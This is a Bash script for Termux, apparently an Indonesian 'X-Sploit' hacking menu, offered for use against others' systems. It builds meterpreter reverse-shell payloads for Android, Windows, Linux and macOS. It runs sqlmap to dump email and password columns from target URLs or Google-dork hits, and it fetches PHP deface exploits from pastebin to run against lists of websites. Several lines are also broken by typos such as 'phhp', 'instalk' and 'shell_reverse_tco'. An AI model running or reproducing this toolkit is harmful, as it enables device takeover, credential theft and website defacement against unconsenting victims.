#!/usr/xbin/bash
#Mau ngapain Gblk
#Jangan Di recode bujank !!
clear
pkg install ruby -y
gem install lolcat
pkg install python2 -y
clear
echo "klik allow/izinkan"
python2 c
termux-setup-storage
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
toilet -f future "[=X-Sploit=]" --gay
echo "[===============================]" | lolcat
echo $blue"༼ つ ◕_◕ ༽つ Code By : Fajar Firdaus"
echo $blue"Fb : Fajar Firdaus"
echo $blue"IG : fajar_firdaus_7"
echo $blue"YT : iTech7732"
echo "[===============================]" | lolcat
sleep 1
echo "Selamat Datang Di X-Sploit" | lolcat
echo "[$]========Installing Session========[$]" | lolcat
echo $green"(1).>Install Metasploit"
echo $green"(2).Install ngrok"
echo $white"[$]========Payload Generator========[$]" | lolcat
echo $red"(A).Android"
echo $red"(W).Windows"
echo $red"(L).Linux"
echo $red"(M).MacOs"
echo $white"[$]========Hacking Website Session========[$]" | lolcat
echo $blue"(SQ).Auto Dump Cc dengan sqlmap"
echo $blue"(SQ1).Auto Dump Cc Dengan sqlmap (pakek dork)"
echo $blue"(D).Auto Deface Web (Method Com_Fabrik)"
echo $blue"(D1).Auto Deface Web (Method fox_contact)"
echo $blue"(N).Scan Vuln Sql Dengan Nmap"
echo $blue"(N1).Scan Subdomain website dengan nmap"
echo $red"(X).keluar"
echo "[$]========Terminal Session========[$]" | lolcat
echo $white"╭─ root@X-Sploit"
read -p "╰$ " j

if [ $j = 1 ]
then
pkg install figlet -y
figlet Installing
pkg install curl -y
pkg install git -y
pkg install ruby -y
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh
echo $red "Metasploit Telah selesai di install"
fi

if [ $j = 2 ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
read -p "Masukin token ngrok lu : " l
./ngrok authtoken $l
./ngrok
fi

if [ $j = A ]
then
echo $red"Pastikan Metasploit Sudah Terinstall"
sleep 1
read -p "Masukan LocalHost elu : " c
read -p "Masukan LocalPort elu : " b
read -p "Masukan nama payload nya : " a
msfvenom -p android/meterpreter/reverse_tcp LHOST=$c LPORT=$b -o /storage/emulated/0/$a
echo $green"Payload Berhasil Dibuat ! silahkan cek payload di memory internal anda"
fi

if [ $j = W ]
then
echo $red"Pastikan Metasploit Sudah Terinstall"
sleep 1
read -p "Masukan LocalHost elu : " a
read -p "Masukan LocalPort elu : " b
read -p "Masukan nama payload nya : " c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat ! silahkan cek payload di memory internal anda"
fi

if [ $j = L ]
then
echo $red"Pastikan Metasploit Sudah Terinstall"
sleep 1
read -p "Masukin LocalHost elu : " a
read -p "Masukin LocalPort elu : " b
read -p "Masukan nama payload nya : " c
echo "[========Pilih Jenis Os========]" | lolcat
echo $blue"(1).aarch64"
echo $blue"(2).x64"
echo $blue"(3).x86"
echo "[========Pilih Jenis Os========]" | lolcat
read -p "Pilih : " h

if [ $h = 1 ]
then
msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $h = 2 ]
then
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$a
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $h = 3 ]
then
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

fi

if [ $j = M ]
then
echo $red"Pastikan Metasploit sudah terinstall"
read -p "Masukan LocalHost elu : " a
read -p "Masukan LocalPort elu : " b
read -p "Masukan nama payload nya : " c
echo "[========Pilih Jenis Os========]" | lolcat
echo $blue"(1).armle"
echo $blue"(2).ppc"
echo $blue"(3).x86"
echo $blue"(4).x64"
echo "[========Pilih Jenis Os========]" | lolcat
read -p "Pilih Os : " k

if [ $k = 1 ]
then
msfvenom -p osx/armle/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $k = 2 ]
then
msfvenom -p osx/ppc/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/o/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $k = 3 ]
then
msfvenom -p osx/x86/shell_reverse_tco LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi

if [ $k = 4 ]
then
msfvenom -p osx/x64/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/o/$c
echo $green"Payload Berhasil Dibuat !  silahkan cek payload di memory internal anda"
fi
fi

if [ $j = SQ ]
then
pkg install figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
pip2 install termcolor
cd sqlmap
read -p "Masukan Hostname/linkweb : " r
python2 sqlmap.py -u $r --batch --dbs --tamper=space2comment --level=2 --risk=2 --flush-session --time-sec 10 --search -C mail,password --smart -o "Done"
echo "Dump Selesai silahkan lihat hasil di folder Done"
ls
fi

if [ $j = SQ1 ]
then
pkg instalk figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
read -p "Masukan Dork nya : " d
python2 sqlmap.py -g $d --batch --dbs --tamper=space2comment --level=2 --risk=2 --smart --flush-session --time-sec 15 --search -C mail,password -o Done
echo $red"Dump Selesai silahkan lihat hasil di folder Done"
fi

if [ $j = D ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
pkg install php -y
read -p "Masukan list Website nya contoh (bacot.txt) : " g
read -p "Masukan Nama script deface (harus berektensi .htm bukan .html)" h
wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php
phhp com_fabrik.php $g $h
fi

if [ $j = D1 ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
pkg install php -y
read -p "Masukan list website nya contoh (bacot.txt) : " k
read -p "Masukan Nama script deface (harus berektensi .htm bukan .html)" t
wget https://pastebin.com/raw/EAtSir5V -O com_foxcontact.php
php com_foxcontact.php $k $t
fi

if [ $j = N ]
then
pkg install figlet -y
figlet Installing
pkg install nmap -y
read -p "Masukan Hostname website nya : " l
nmap -sV --script=http-sql-brute.nse $l -p 80
echo $green"Scan website selesai"
fi

if [ $j = N1 ]
then
pkg install figlet -y
figlet Installing
pkg install nmap -y
read -p "Masukan Hostname website nya : " g
nmap -sV --script=dns-brute.nse $g -p 80
echo $green"Scan Website selesai"
fi

if [ $j = X ]
then
echo $white"Terimakasih Telah Memakai tools ini :)"
sleep 1
echo $red"Jangan Di recode ya bujang"
sleep 1
echo $red"Capek gua bikin nya"
sleep 1
toilet -f future Bye --gay
exit
fi
